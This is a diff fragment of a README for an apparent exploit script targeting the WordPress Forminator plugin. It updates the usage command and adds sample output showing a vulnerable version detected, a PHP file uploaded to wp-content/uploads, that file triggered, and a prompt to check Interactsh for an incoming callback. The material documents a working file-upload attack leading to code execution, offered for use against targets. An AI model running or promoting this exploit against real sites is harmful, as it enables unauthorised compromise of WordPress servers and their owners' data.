@@ -21,6 +21,17 @@ body="/wp-content/plugins/forminator"
 ```
 ### Usage
 ```
-python3 exploit.py -v -u https://target-IP/
+python3 exploit.py -v -u https://target-IP/?p=7
+```
+```
+  [+] Vulnerable version found: 1.24.6
+  [+] Sending payload to target
+  [+] Successful file upload!
+
+Uploaded File Location: http://target-IP/wp-content/uploads/2023/08/QotTkAFBsf.php
+
+  [+] Sending request to uploaded file...
+  [+] Successfully triggered the uploaded file!
+  [+] Check Interactsh for an incoming request.
 ```
 
